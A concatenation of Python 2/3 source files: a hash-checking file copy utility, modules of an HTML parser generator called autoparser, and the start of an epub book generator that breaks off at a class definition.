#! /usr/bin/env python2
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import sys
import json
import shutil
import os.path
import hashlib
import argparse


_DB_FN = "~/.cp_when_changed.json"
_DB_FN = os.path.expanduser(_DB_FN)


def compute_hash(fn):
    with open(fn) as f:
        return hashlib.sha512(f.read()).hexdigest()


def read_db():
    if not os.path.exists(_DB_FN):
        return {}

    with open(_DB_FN) as f:
        data = f.read()
        return json.loads(data)


def save_db(data):
    with open(_DB_FN, "w") as f:
        f.write(json.dumps(data))


def cp_when_changed(src, dst):
    data = read_db()

    src = os.path.abspath(src)
    current_hash = compute_hash(src)

    old_hash = data.get(src)
    if old_hash == current_hash:
        print "Nothing changed."
        return

    shutil.copy2(src, dst)
    print "Copied `%s` to `%s`." % (src, dst)

    data[src] = current_hash
    save_db(data)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "SRC",
        help="Copy SRC."
    )
    parser.add_argument(
        "DST",
        help="To DST."
    )

    args = parser.parse_args()

    if not os.path.exists(args.SRC):
        sys.stderr.write("`%s` doesn't exists!\n" % args.SRC)
        sys.exit(1)

    cp_when_changed(args.SRC, args.DST)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
This module contains functions to convert `DOM` relations to `path-like` lists
of elements defined by tag names and parameters.
"""
# Imports =====================================================================


# Functions & objects =========================================================
def el_to_path_vector(el):
    """
    Convert `el` to vector of foregoing elements.

    Attr:
        el (obj): Double-linked HTMLElement instance.

    Returns:
        list: HTMLElements which considered as path from root to `el`.
    """
    path = []
    while el.parent:
        path.append(el)
        el = el.parent

    return list(reversed(path + [el]))


def common_vector_root(vec1, vec2):
    """
    Return common root of the two vectors.

    Args:
        vec1 (list/tuple): First vector.
        vec2 (list/tuple): Second vector.

    Usage example::

        >>> common_vector_root([1, 2, 3, 4, 5], [1, 2, 8, 9, 0])
        [1, 2]

    Returns:
        list: Common part of two vectors or blank list.
    """
    root = []
    for v1, v2 in zip(vec1, vec2):
        if v1 == v2:
            root.append(v1)
        else:
            return root

    return root


def find_common_root(elements):
    """
    Find root which is common for all `elements`.

    Args:
        elements (list): List of double-linked HTMLElement objects.

    Returns:
        list: Vector of HTMLElement containing path to common root.
    """
    if not elements:
        raise UserWarning("Can't find common root - no elements suplied.")

    root_path = el_to_path_vector(elements.pop())

    for el in elements:
        el_path = el_to_path_vector(el)

        root_path = common_vector_root(root_path, el_path)

        if not root_path:
            raise UserWarning(
                "Vectors without common root:\n%s" % str(el_path)
            )

    return root_path
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================



# Variables ===================================================================



# Functions & classes =========================================================



# Main program ================================================================
if __name__ == '__main__':
    pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
Functions which allows to read serialized informations for autoparser.
"""
# Imports =====================================================================
import os.path
import copy

import yaml
import httpkie


# Functions & objects =========================================================
def _get_source(link):
    """
    Return source of the `link` whether it is filename or url.

    Args:
        link (str): Filename or URL.

    Returns:
        str: Content.

    Raises:
        UserWarning: When the `link` couldn't be resolved.
    """
    if link.startswith("http://") or link.startswith("https://"):
        down = httpkie.Downloader()
        return down.download(link)

    if os.path.exists(link):
        with open(link) as f:
            return f.read()

    raise UserWarning("html: '%s' is neither URL or data!" % link)


def _process_config_item(item, dirname):
    """
    Process one item from the configuration file, which contains multiple items
    saved as dictionary.

    This function reads additional data from the config and do some
    replacements - for example, if you specify url, it will download data
    from this url and so on.

    Args:
        item (dict): Item, which will be processed.

    Note:
        Returned data format::
            {
                "link": "link to html page/file",
                "html": "html code from file/url",
                "vars": {
                    "varname": {
                        "data": "matching data..",
                        ...
                    }
                }
            }

    Returns:
        dict: Dictionary in format showed above.
    """
    item = copy.deepcopy(item)
    html = item.get("html", None)

    if not html:
        raise UserWarning("Can't find HTML source for item:\n%s" % str(item))

    # process HTML link
    link = html if "://" in html else os.path.join(dirname, html)
    del item["html"]

    # replace $name with the actual name of the field
    for key, val in item.items():
        if "notfoundmsg" in val:
            val["notfoundmsg"] = val["notfoundmsg"].replace("$name", key)

    return {
        "html": _get_source(link),
        "link": link,
        "vars": item
    }


def read_config(file_name):
    """
    Read YAML file with configuration and pointers to example data.

    Args:
        file_name (str): Name of the file, where the configuration is stored.

    Returns:
        dict: Parsed and processed data (see :func:`_process_config_item`).

    Example YAML file::
        html: simple_xml.xml
        first:
            data: i wan't this
            required: true
            notfoundmsg: Can't find variable $name.
        second:
            data: and this
        ---
        html: simple_xml2.xml
        first:
            data: something wanted
            required: true
            notfoundmsg: Can't find variable $name.
        second:
            data: another wanted thing
    """
    dirname = os.path.dirname(
        os.path.abspath(file_name)
    )
    dirname = os.path.relpath(dirname)

    # create utf-8 strings, not unicode
    def custom_str_constructor(loader, node):
        return loader.construct_scalar(node).encode('utf-8')
    yaml.add_constructor(u'tag:yaml.org,2002:str', custom_str_constructor)

    config = []
    with open(file_name) as f:
        for item in yaml.load_all(f.read()):
            config.append(
                _process_config_item(item, dirname)
            )

    return config
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
This module contains number of functions, which are used at multiple places in
autoparser.
"""
# Imports =====================================================================
import dhtmlparser


# Functions & objects =========================================================
def _get_encoding(dom, default="utf-8"):
    """
    Try to look for meta tag in given `dom`.

    Args:
        dom (obj): pyDHTMLParser dom of HTML elements.
        default (default "utr-8"): What to use if encoding is not found in
                                   `dom`.

    Returns:
        str/default: Given encoding or `default` parameter if not found.
    """
    encoding = dom.find("meta", {"http-equiv": "Content-Type"})

    if not encoding:
        return default

    encoding = encoding[0].params.get("content", None)

    if not encoding:
        return default

    return encoding.lower().split("=")[-1]


def handle_encodnig(html):
    """
    Look for encoding in given `html`. Try to convert `html` to utf-8.

    Args:
        html (str): HTML code as string.

    Returns:
        str: HTML code encoded in UTF.
    """
    encoding = _get_encoding(
        dhtmlparser.parseString(
            html.split("</head>")[0]
        )
    )

    if encoding == "utf-8":
        return html

    return html.decode(encoding).encode("utf-8")


def content_matchs(tag_content, content_transformer=None):
    """
    Generate function, which checks whether the content of the tag matchs
    `tag_content`.

    Args:
        tag_content (str): Content of the tag which will be matched thru whole
                           DOM.
        content_transformer (fn, default None): Function used to transform all
                            tags before matching.

    Returns:
        bool: True for every matching tag.

    Note:
        This function can be used as parameter for ``.find()`` method in
        HTMLElement.
    """
    def content_matchs_closure(element):
        if not element.isTag():
            return False

        cont = element.getContent()
        if content_transformer:
            cont = content_transformer(cont)

        return tag_content == cont

    return content_matchs_closure


def is_equal_tag(element, tag_name, params, content):
    """
    Check is `element` object match rest of the parameters.

    All checks are performed only if proper attribute is set in the HTMLElement.

    Args:
        element (obj): HTMLElement instance.
        tag_name (str): Tag name.
        params (dict): Parameters of the tag.
        content (str): Content of the tag.

    Returns:
        bool: True if everyhing matchs, False otherwise.
    """
    if tag_name and tag_name != element.getTagName():
        return False

    if params and not element.containsParamSubset(params):
        return False

    if content is not None and content.strip() != element.getContent().strip():
        return False

    return True


def has_neigh(tag_name, params=None, content=None, left=True):
    """
    This function generates functions, which matches all tags with neighbours
    defined by parameters.

    Args:
        tag_name (str): Tag has to have neighbour with this tagname.
        params (dict): Tag has to have neighbour with this parameters.
        params (str): Tag has to have neighbour with this content.
        left (bool, default True): Tag has to have neigbour on the left, or
                                   right (set to ``False``).

    Returns:
        bool: True for every matching tag.

    Note:
        This function can be used as parameter for ``.find()`` method in
        HTMLElement.
    """
    def has_neigh_closure(element):
        if not element.parent \
           or not (element.isTag() and not element.isEndTag()):
            return False

        # filter only visible tags/neighbours
        childs = element.parent.childs
        childs = filter(
            lambda x: (x.isTag() and not x.isEndTag()) \
                      or x.getContent().strip() or x is element,
            childs
        )
        if len(childs) <= 1:
            return False

        ioe = childs.index(element)
        if left and ioe > 0:
            return is_equal_tag(childs[ioe - 1], tag_name, params, content)

        if not left and ioe + 1 < len(childs):
            return is_equal_tag(childs[ioe + 1], tag_name, params, content)

        return False

    return has_neigh_closure
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
This module defines path-constructor functions and containers for data.

Containers are later used for validation of the paths in other examples and
for generator, which creates the parser.
"""


# Functions & objects =========================================================
class NeighCall(object):
    """
    Class used to store informations about neighbour calls, generated by
    :func:`_neighbour_to_path_call`.

    Attributes:
        tag_name (str): Name of the container for the data.
        params (dict): Parameters for the fontainer.
        fn_params (list): Parameters for the fuction which will find neighbour
                          (see :func:`.has_neigh`).
    """
    def __init__(self, tag_name, params, fn_params):
        self.tag_name = tag_name
        self.params = params
        self.fn_params = fn_params


class PathCall(object):
    """
    Container used to hold data, which will be used as parameter to call search
    functions in `DOM`.

    Arguments:
        call_type (str): Determines type of the call to the HTMLElement method.
        index (int): Index of the item after `call_type` function is called.
        params (dict): Another parameters for `call_type` function.
    """
    def __init__(self, call_type, index, params):
        self.call_type = call_type
        self.index = index
        self.params = params


class Chained(object):
    """
    Container to hold parameters of the chained calls.

    Arguments:
        chain (list): List of :class:`PathCall` classes.
    """
    def __init__(self, chain):
        # necesarry because of reversed() and other iterator-returning
        # functions
        self.chain = list(chain)

    @property
    def call_type(self):
        """
        Property added to make sure, that :class:`Chained` is interchangeable
        with :class:`PathCall`.
        """
        return "Chained"


def _params_or_none(params):
    """
    `params` if `params`, else `None`. What else to say..
    """
    return params if params else None


def _neighbour_to_path_call(neig_type, neighbour, element):
    """
    Get :class:`PathCall` from `neighbour` and `element`.

    Args:
        neigh_type (str): `left` for left neighbour, `right` for .. This is
                          used to determine :attr:`PathCall.call_type` of
                          returned object.
        neighbour (obj): Reference to `neighbour` object.
        element (obj): Reference to HTMLElement holding required data.

    Returns:
        obj: :class:`PathCall` instance with data necessary to find `element` \
             by comparing its `neighbour`.
    """
    params = [None, None, neighbour.getContent().strip()]

    if neighbour.isTag():
        params = [
            neighbour.getTagName(),
            _params_or_none(neighbour.params),
            neighbour.getContent().strip()
        ]

    return PathCall(
        neig_type + "_neighbour_tag",
        0,  # TODO: Dynamic lookup
        NeighCall(element.getTagName(), _params_or_none(element.params), params)
    )


def neighbours_pattern(element):
    """
    Look for negihbours of the `element`, return proper :class:`PathCall`.

    Args:
        element (obj): HTMLElement instance of the object you are looking for.

    Returns:
        list: List of :class:`PathCall` instances.
    """
    # check if there are any neighbours
    if not element.parent:
        return []

    parent = element.parent

    # filter only visible tags/neighbours
    neighbours = filter(
        lambda x: x.isTag() and not x.isEndTag() or x.getContent().strip() \
                  or x is element,
        parent.childs
    )
    if len(neighbours) <= 1:
        return []

    output = []
    element_index = neighbours.index(element)

    # pick left neighbour
    if element_index >= 1:
        output.append(
            _neighbour_to_path_call(
                "left",
                neighbours[element_index - 1],
                element
            )
        )

    # pick right neighbour
    if element_index + 1 < len(neighbours):
        output.append(
            _neighbour_to_path_call(
                "right",
                neighbours[element_index + 1],
                element
            )
        )

    return output


def predecesors_pattern(element, root):
    """
    Look for `element` by its predecesors.

    Args:
        element (obj): HTMLElement instance of the object you are looking for.
        root (obj): Root of the `DOM`.

    Returns:
        list: ``[PathCall()]`` - list with one :class:`PathCall` object (to \
              allow use with ``.extend(predecesors_pattern())``).
    """
    def is_root_container(el):
        return el.parent.parent.getTagName() == ""

    if not element.parent or not element.parent.parent or \
       is_root_container(element):
        return []

    trail = [
        [
            element.parent.parent.getTagName(),
            _params_or_none(element.parent.parent.params)
        ],
        [
            element.parent.getTagName(),
            _params_or_none(element.parent.params)
        ],
        [element.getTagName(), _params_or_none(element.params)],
    ]

    match = root.match(*trail)
    if element in match:
        return [
            PathCall("match", match.index(element), trail)
        ]
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
This module contains number of template generators, which generates all the
python code for the parser.
"""
# Imports =====================================================================
import inspect

import utils
import conf_reader
import path_patterns


# Variables ===================================================================
IND = "    "  #: Indentation.


# Functions & objects =========================================================
def _index_idiom(el_name, index, alt=None):
    """
    Generate string where `el_name` is indexed by `index` if there are enough
    items or `alt` is returned.

    Args:
        el_name (str): Name of the `container` which is indexed.
        index (int): Index of the item you want to obtain from container.
        alt (whatever, default None): Alternative value.

    Returns:
        str: Python code.

    Live example::
        >>> import generator as g
        >>> print g._index_idiom("xex", 0)
            # pick element from list
            xex = xex[0] if xex else None
        >>> print g._index_idiom("xex", 1, "something")
        # pick element from list
        xex = xex[1] if len(xex) - 1 >= 1 else 'something'
    """
    el_index = "%s[%d]" % (el_name, index)

    if index == 0:
        cond = "%s" % el_name
    else:
        cond = "len(%s) - 1 >= %d" % (el_name, index)

    output = IND + "# pick element from list\n"

    return output + IND + "%s = %s if %s else %s\n\n" % (
        el_name,
        el_index,
        cond,
        repr(alt)
    )


def _required_idiom(tag_name, index, notfoundmsg):
    """
    Generate code, which make sure that `tag_name` has enoug items.

    Args:
        tag_name (str): Name of the container.
        index (int): Index of the item you want to obtain from container.
        notfoundmsg (str): Raise :class:`.UserWarning` with debug data and
                           following message.

    Returns:
        str: Python code.
    """
    cond = ""
    if index > 0:
        cond = " or len(el) - 1 < %d" % index

    tag_name = str(tag_name)

    output = IND + "if not el%s:\n" % cond
    output += IND + IND + "raise UserWarning(\n"
    output += IND + IND + IND + "%s +\n" % repr(notfoundmsg.strip() + "\n")
    output += IND + IND + IND + repr("Tag name: " + tag_name) + " + '\\n' +\n"
    output += IND + IND + IND + "'El:' + str(el) + '\\n' +\n"
    output += IND + IND + IND + "'Dom:' + str(dom)\n"
    output += IND + IND + ")\n\n"

    return output + IND + "el = el[%d]\n\n" % index


# parser template generators ##################################################
def _find_template(parameters, index, required=False, notfoundmsg=None):
    """
    Generate ``.find()`` call for HTMLElement.

    Args:
        parameters (list): List of parameters for ``.find()``.
        index (int): Index of the item you want to get from ``.find()`` call.
        required (bool, default False): Use :func:`_required_idiom` to returned
                 data.
        notfoundmsg (str, default None): Message which will be used for
                    :func:`_required_idiom` if the item is not found.

    Returns:
        str: Python code.

    Live example::
        >>> print g._find_template(["<xex>"], 3)
            el = dom.find('<xex>')
            # pick element from list
            el = el[3] if len(el) - 1 >= 3 else None
    """
    output = IND + "el = dom.find(%s)\n\n" % repr(parameters)[1:-1]

    if required:
        return output + _required_idiom(parameters[0], index, notfoundmsg)

    return output + _index_idiom("el", index)


def _wfind_template(use_dom, parameters, index, required=False,
                                                notfoundmsg=None):
    """
    Generate ``.wfind()`` call for HTMLElement.

    Args:
        use_dom (bool): Use ``dom`` as tag name. If ``False``, ``el`` is used.
        parameters (list): List of parameters for ``.wfind()``.
        index (int): Index of the item you want to get from ``.wfind()`` call.
        required (bool, default False): Use :func:`_required_idiom` to returned
                 data.
        notfoundmsg (str, default None): Message which will be used for
                    :func:`_required_idiom` if the item is not found.

    Returns:
        str: Python code.

    Live example::
        >>> print g._wfind_template(True, ["<xex>"], 3)
            el = dom.wfind('<xex>').childs
            # pick element from list
            el = el[3] if len(el) - 1 >= 3 else None
    """
    tag_name = "dom" if use_dom else "el"
    output = IND + "el = %s.wfind(%s).childs\n\n" % (
        tag_name,
        repr(parameters)[1:-1]
    )

    if required:
        return output + _required_idiom(parameters[0], index, notfoundmsg)

    return output + _index_idiom("el", index)


def _match_template(parameters, index, required=False, notfoundmsg=None):
    """
    Generate ``.match()`` call for HTMLElement.

    Args:
        parameters (list): List of parameters for ``.match()``.
        index (int): Index of the item you want to get from ``.match()`` call.
        required (bool, default False): Use :func:`_required_idiom` to returned
                 data.
        notfoundmsg (str, default None): Message which will be used for
                    :func:`_required_idiom` if the item is not found.

    Returns:
        str: Python code.

    Live example::
        >>> print g._match_template(["<xex>"], 3)
            el = dom.match('<xex>')
            # pick element from list
            el = el[3] if len(el) - 1 >= 3 else None
    """
    output = IND + "el = dom.match(%s)\n\n" % repr(parameters)[1:-1]

    #TODO: reduce None parameters

    if required:
        return output + _required_idiom(parameters[0], index, notfoundmsg)

    return output + _index_idiom("el", index)


def _neigh_template(parameters, index, left=True, required=False,
                                                  notfoundmsg=None):
    """
    Generate neighbour matching call for HTMLElement, which returns only
    elements with required neighbours.

    Args:
        parameters (list): List of parameters for ``.match()``.
        index (int): Index of the item you want to get from ``.match()`` call.
        left (bool, default True): Look for neigbour in the left side of el.
        required (bool, default False): Use :func:`_required_idiom` to returned
                 data.
        notfoundmsg (str, default None): Message which will be used for
                    :func:`_required_idiom` if the item is not found.

    Returns:
        str: Python code.
    """
    fn_string = "has_neigh(%s, left=%s)" % (
        repr(parameters.fn_params)[1:-1],
        repr(left)
    )

    output = IND + "el = dom.find(\n"
    output += IND + IND + "%s,\n" % repr(parameters.tag_name)

    if parameters.params:
        output += IND + IND + "%s,\n" % repr(parameters.params)

    output += IND + IND + "fn=%s\n" % fn_string
    output += IND + ")\n\n"

    if required:
        return output + _required_idiom(
            parameters.fn_params[0],
            index,
            notfoundmsg
        )

    return output + _index_idiom("el", index)

# /parser template generators #################################################


def _get_parser_name(var_name):
    """
    Parser name composer.

    Args:
        var_name (str): Name of the variable.

    Returns:
        str: Parser function name.
    """
    return "get_%s" % var_name


def _generate_parser(name, path, required=False, notfoundmsg=None):
    """
    Generate parser named `name` for given `path`.

    Args:
        name (str): Basename for the parsing function (see
                    :func:`_get_parser_name` for details).
        path (obj): :class:`.PathCall` or :class:`.Chained` instance.
        required (bool, default False): Use :func:`_required_idiom` to returned
                 data.
        notfoundmsg (str, default None): Message which will be used for
                    :func:`_required_idiom` if the item is not found.

    Returns:
        str: Python code for parsing `path`.
    """
    output = "def %s(dom):\n" % _get_parser_name(name)

    dom = True  # used specifically in _wfind_template
    parser_table = {
        "find": lambda path:
            _find_template(path.params, path.index, required, notfoundmsg),
        "wfind": lambda path:
            _wfind_template(
                dom,
                path.params,
                path.index,
                required,
                notfoundmsg
            ),
        "match": lambda path:
            _match_template(path.params, path.index, required, notfoundmsg),
        "left_neighbour_tag": lambda path:
            _neigh_template(
                path.params,
                path.index,
                True,
                required,
                notfoundmsg
            ),
        "right_neighbour_tag": lambda path:
            _neigh_template(
                path.params,
                path.index,
                False,
                required,
                notfoundmsg
            ),
    }

    if isinstance(path, path_patterns.PathCall):
        output += parser_table[path.call_type](path)
    elif isinstance(path, path_patterns.Chained):
        for path in path.chain:
            output += parser_table[path.call_type](path)
            dom = False
    else:
        raise UserWarning(
            "Unknown type of path parameters! (%s)" % str(path)
        )

    output += IND + "return el\n"
    output += "\n\n"

    return output


def _unittest_template(config):
    """
    Generate unittests for all of the generated code.

    Args:
        config (dict): Original configuration dictionary. See
               :mod:`~harvester.autoparser.conf_reader` for details.

    Returns:
        str: Python code.
    """
    output = "def test_parsers():\n"

    links = dict(map(lambda x: (x["link"], x["vars"]), config))

    for link in links.keys():
        output += IND + "# Test parsers against %s\n" % link
        output += IND + "html = handle_encodnig(\n"
        output += IND + IND + "_get_source(%s)\n" % repr(link)
        output += IND + ")\n"
        output += IND + "dom = dhtmlparser.parseString(html)\n"
        output += IND + "dhtmlparser.makeDoubleLinked(dom)\n\n"

        for var in links[link]:
            content = links[link][var]["data"].strip()

            output += IND + "%s = %s(dom)\n" % (var, _get_parser_name(var))

            if "\n" in content:
                output += IND
                output += "assert %s.getContent().strip().split() == %s" % (
                    var,
                    repr(content.split())
                )
            else:
                output += IND + "assert %s.getContent().strip() == %s" % (
                    var,
                    repr(content)
                )

            output += "\n\n"

    return output + "\n"


def generate_parsers(config, paths):
    """
    Generate parser for all `paths`.

    Args:
        config (dict): Original configuration dictionary used to get matches
                       for unittests. See
                       :mod:`~harvester.autoparser.conf_reader` for details.
        paths (dict): Output from :func:`.select_best_paths`.

    Returns:
        str: Python code containing all parsers for `paths`.
    """
    output = """#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# HTML parser generated by Autoparser
# (https://github.com/edeposit/edeposit.amqp.harvester)
#
import os
import os.path

import httpkie
import dhtmlparser


# Utilities
"""
    # add source of neighbour picking functions from utils.py
    output += inspect.getsource(conf_reader._get_source) + "\n\n"
    output += inspect.getsource(utils._get_encoding) + "\n\n"
    output += inspect.getsource(utils.handle_encodnig) + "\n\n"
    output += inspect.getsource(utils.is_equal_tag) + "\n\n"
    output += inspect.getsource(utils.has_neigh) + "\n\n"
    output += "# Generated parsers\n"

    for name, path in paths.items():
        path = path[0]  # pick path with highest priority

        required = config[0]["vars"][name].get("required", False)
        notfoundmsg = config[0]["vars"][name].get("notfoundmsg", "")

        output += _generate_parser(name, path, required, notfoundmsg)

    output += "# Unittest\n"
    output += _unittest_template(config)

    output += "# Run tests of the parser\n"
    output += "if __name__ == '__main__':\n"
    output += IND + "test_parsers()"

    return output
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys
import os.path
import argparse

import dhtmlparser

sys.path.insert(
    0,
    os.path.normpath(
        os.path.join(os.path.dirname(__file__), "../src")
    )
)

import autoparser
import autoparser.utils as utils
import autoparser.conf_reader as conf_reader
import autoparser.vectors as vectors
import autoparser.path_patterns as path_patterns
import autoparser.generator as generator
from autoparser.path_patterns import PathCall, Chained


# Functions & objects =========================================================
def _create_dom(data):
    """
    Creates doublelinked DOM from `data`.

    Args:
        data (str/HTMLElement): Either string or HTML element.

    Returns:
        obj: HTMLElement containing double linked DOM.
    """
    if not isinstance(data, dhtmlparser.HTMLElement):
        data = dhtmlparser.parseString(
            utils.handle_encodnig(data)
        )

    dhtmlparser.makeDoubleLinked(data)

    return data


def _locate_element(dom, el_content, transformer=None):
    """
    Find element containing `el_content` in `dom`. Use `transformer` function
    to content of all elements in `dom` in order to correctly transforming them
    to match them with `el_content`.

    Args:
        dom (obj): HTMLElement tree.
        el_content (str): Content of element will be picked from `dom`.
        transformer (fn, default None): Transforming function.

    Note:
        `transformer` parameter can be for example simple lambda::

            lambda x: x.strip()

    Returns:
        list: Matching HTMLElements.
    """
    return dom.find(
        None,
        fn=utils.content_matchs(el_content, transformer)
    )


def _match_elements(dom, matches):
    """
    Find location of elements matching patterns specified in `matches`.

    Args:
        dom (obj): HTMLElement DOM tree.
        matches (dict): Structure: ``{"var": {"data": "match", ..}, ..}``.

    Returns:
        dict: Structure: ``{"var": {"data": HTMLElement_obj, ..}, ..}``
    """
    out = {}
    for key, content in matches.items():
        pattern = content["data"].strip()
        if "\n" in pattern:
            pattern = pattern.split()
            transformer = lambda x: x.strip().split()
        else:
            transformer = lambda x: x.strip()

        matching_elements = _locate_element(
            dom,
            pattern,
            transformer=transformer
        )

        not_found_msg = content.get("notfoundmsg", "").replace("$name", key)
        if not not_found_msg.strip():
            not_found_msg = "Can't locate variable '%s' with content '%s'!" % (
                key,
                pattern,
            )
        content["notfoundmsg"] = not_found_msg

        # in case of multiple elements, find only elements with propert tagname
        tagname = content.get("tagname", "").strip().lower()
        if tagname:
            matching_elements = filter(
                lambda x: x.getTagName().strip().lower() == tagname,
                matching_elements
            )

        if not matching_elements:
            raise UserWarning(not_found_msg)

        if len(matching_elements) > 1:
            raise UserWarning(
                "Ambigious content '%s'!" % content
                + "Content was found in multiple elements!"
            )

        out[key] = matching_elements[0]

    return out


def _collect_paths(element):
    """
    Collect all possible path which leads to `element`.

    Function returns standard path from root element to this, reverse path,
    which uses negative indexes for path, also some pattern matches, like
    "this is element, which has neighbour with id 7" and so on.

    Args:
        element (obj): HTMLElement instance.

    Returns:
        list: List of :class:`.PathCall` and :class:`.Chained` objects.
    """
    output = []

    # look for element by parameters - sometimes the ID is unique
    path = vectors.el_to_path_vector(element)
    root = path[0]
    params = element.params if element.params else None
    match = root.find(element.getTagName(), params)

    if len(match) == 1:
        output.append(
            PathCall("find", 0, [element.getTagName(), params])
        )

    # look for element by neighbours
    output.extend(path_patterns.neighbours_pattern(element))

    # look for elements by patterns - element, which parent has tagname, and
    # which parent has tagname ..
    output.extend(path_patterns.predecesors_pattern(element, root))

    index_backtrack = []
    last_index_backtrack = []
    params_backtrack = []
    last_params_backtrack = []

    # look for element by paths from root to element
    for el in reversed(path):
        # skip root elements
        if not el.parent:
            continue

        tag_name = el.getTagName()
        match = el.parent.wfind(tag_name).childs
        index = match.index(el)

        index_backtrack.append(
            PathCall("wfind", index, [tag_name])
        )
        last_index_backtrack.append(
            PathCall("wfind", index - len(match), [tag_name])
        )

        # if element has some parameters, use them for lookup
        if el.params:
            match = el.parent.wfind(tag_name, el.params).childs
            index = match.index(el)

            params_backtrack.append(
                PathCall("wfind", index, [tag_name, el.params])
            )
            last_params_backtrack.append(
                PathCall("wfind", index - len(match), [tag_name, el.params])
            )
        else:
            params_backtrack.append(
                PathCall("wfind", index, [tag_name])
            )
            last_params_backtrack.append(
                PathCall("wfind", index - len(match), [tag_name])
            )

    output.extend([
        Chained(reversed(params_backtrack)),
        Chained(reversed(last_params_backtrack)),
        Chained(reversed(index_backtrack)),
        Chained(reversed(last_index_backtrack)),
    ])

    return output


def _is_working_path(dom, path, element):
    """
    Check whether the path is working or not.

    Aply proper search function interpreting `path` to `dom` and check, if
    returned object is `element`. If so, return ``True``, otherwise ``False``.

    Args:
        dom (obj): HTMLElement DOM.
        path (obj): :class:`.PathCall` Instance containing informations about
                    path and which function it require to obtain element the
                    path is pointing to.
        element (obj): HTMLElement instance used to decide whether `path`
                       points to correct `element` or not.

    Returns:
        bool: True if `path` correctly points to proper `element`.
    """
    def i_or_none(el, i):
        """
        Return ``el[i]`` if the list is not blank, or None otherwise.

        Args:
            el (list, tuple): Any indexable object.
            i (int): Index.

        Returns:
            obj: Element at index `i` if `el` is not blank, or ``None``.
        """
        if not el:
            return None

        return el[i]

    # map decoders of all paths to one dictionary to make easier to call them
    path_functions = {
        "find": lambda el, index, params:
            i_or_none(el.find(*params), index),
        "wfind": lambda el, index, params:
            i_or_none(el.wfind(*params).childs, index),
        "match": lambda el, index, params:
            i_or_none(el.match(*params), index),
        "left_neighbour_tag": lambda el, index, neigh_data:
            i_or_none(
                el.find(
                    neigh_data.tag_name,
                    neigh_data.params,
                    fn=utils.has_neigh(*neigh_data.fn_params, left=True)
                ),
                index
            ),
        "right_neighbour_tag": lambda el, index, neigh_data:
            i_or_none(
                el.find(
                    neigh_data.tag_name,
                    neigh_data.params,
                    fn=utils.has_neigh(*neigh_data.fn_params, left=False)
                ),
                index
            ),
    }

    # call all decoders and see what you get from them
    el = None
    if isinstance(path, PathCall):
        el = path_functions[path.call_type](dom, path.index, path.params)
    elif isinstance(path, Chained):
        for path in path.chain:
            dom = path_functions[path.call_type](dom, path.index, path.params)
            if not dom:
                return False
        el = dom
    else:
        raise UserWarning(
            "Unknown type of path parameters! (%s)" % str(path)
        )

    if not el:
        return False

    # test whether returned item is the item we are looking for
    return el.getContent().strip() == element.getContent().strip()


def select_best_paths(examples):
    """
    Process `examples`, select only paths that works for every example. Select
    best paths with highest priority.

    Args:
        examples (dict): Output from :func:`.read_config`.

    Returns:
        list: List of :class:`.PathCall` and :class:`.Chained` objects.
    """
    possible_paths = {}  # {varname: [paths]}

    # collect list of all possible paths to all existing variables
    for example in examples:
        dom = _create_dom(example["html"])
        matching_elements = _match_elements(dom, example["vars"])

        for key, match in matching_elements.items():
            if key not in possible_paths:  # TODO: merge paths together?
                possible_paths[key] = _collect_paths(match)

    # leave only paths, that works in all examples where, are required
    for example in examples:
        dom = _create_dom(example["html"])
        matching_elements = _match_elements(dom, example["vars"])

        for key, paths in possible_paths.items():
            if key not in matching_elements:
                continue

            possible_paths[key] = filter(
                lambda path: _is_working_path(
                    dom,
                    path,
                    matching_elements[key]
                ),
                paths
            )

    priorities = [
        "find",
        "left_neighbour_tag",
        "right_neighbour_tag",
        "wfind",
        "match",
        "Chained"
    ]
    priorities = dict(map(lambda x: (x[1], x[0]), enumerate(priorities)))

    # sort all paths by priority table
    for key in possible_paths.keys():
        possible_paths[key] = list(sorted(
            possible_paths[key],
            key=lambda x: priorities.get(x.call_type, 100)
        ))

    return possible_paths


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="Autoparser - parser generator."
    )
    parser.add_argument(
        "-c",
        "--config",
        required=True,
        help="""YAML Configuration file used to specify paths to data and
                matches, which will be used to create generator."""
    )

    args = parser.parse_args()

    if not os.path.exists(args.config):
        sys.stderr.write("Can't open '%s'!\n" % args.config)
        sys.exit(1)

    config = conf_reader.read_config(args.config)

    if not config:
        sys.stderr.write("Configuration file '%s' is blank!\n" % args.config)
        sys.exit(1)

    paths = select_best_paths(config)
    print generator.generate_parsers(config, paths)
#! /usr/bin/env python3
import time
import os.path
import argparse

import dhtmlparser
from ebooklib import epub

PROJECT_URL = "https://github.com/Bystroushaak/Environment_and_programming_language_self_epub_generator"


class BookGenerator:
    """
    Just to keep track about chapters, automatically generate table of contents
    and so on.
    """
    def __init__(self, title):
        self.book = epub.EpubBook()
        self.title = title
        self.chapters = []

        self.book.set_title(self.title)

    def generate_ebook(self, path):
        self._add_css()
        self._add_toc()

        epub.write_epub(path, self.book, {})

    def set_language(self, lang):
        return self.book.set_language(lang)

    def add_metadata(self, namespace, name, value, others=None):
        return self.book.add_metadata(namespace, name, value, others)

    def add_chapter(self, chapter):
        self.book.add_item(chapter)
        self.chapters.append(chapter)

    def add_image(self, image):
        self.book.add_item(image)

    def add_author(self, author):
        self.book.add_author(author)

    def _add_toc(self):
        self.book.toc = (
            (epub.Section(self.title),
             self.chapters),
        )

        self.book.add_item(epub.EpubNcx())
        self.book.add_item(epub.EpubNav())

        self.book.spine = ['nav'] + self.chapters

    def _add_css(self):
        # define CSS style
        style = 'BODY {color: white;}'
        nav_css = epub.EpubItem(
            uid="style_nav",
            file_name="style/nav.css",
            media_type="text/css",
            content=style
        )

        self.book.add_item(nav_css)


class EAPLSEpub:
